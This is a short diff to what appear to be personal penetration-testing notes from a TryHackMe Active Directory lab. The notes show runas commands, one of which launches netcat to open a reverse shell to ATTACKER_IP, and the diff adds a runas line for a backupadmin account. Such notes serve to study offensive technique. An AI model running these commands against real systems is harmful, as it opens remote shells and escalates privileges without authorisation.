@@ -2756,6 +2756,9 @@ Users can administer Domain Controllers. They cannot change any administrative g
 - Use runas
 ```bash
 runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
+
+# when we have RDP
+runas /user:backupadmin cmd
 ```
 
 
